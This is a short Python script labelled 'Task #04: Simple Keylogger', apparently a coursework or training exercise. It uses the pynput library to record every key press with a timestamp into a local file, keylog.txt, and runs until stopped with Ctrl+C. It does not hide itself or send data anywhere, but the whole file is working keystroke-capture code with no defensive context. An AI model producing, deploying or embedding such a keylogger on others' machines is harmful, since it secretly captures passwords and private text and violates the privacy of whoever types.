# Task #04:
# Simple Keylogger


from pynput import keyboard
import time

def on_key_press(key):
    try:
        log_file = open("keylog.txt", "a")
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        log_file.write(f"{timestamp} - {key}\n")
        log_file.close()
    except Exception as e:
        print(f"Error logging key: {e}")

def main():
    print("Press Ctrl+C to stop logging.")
    with keyboard.Listener(on_press=on_key_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
    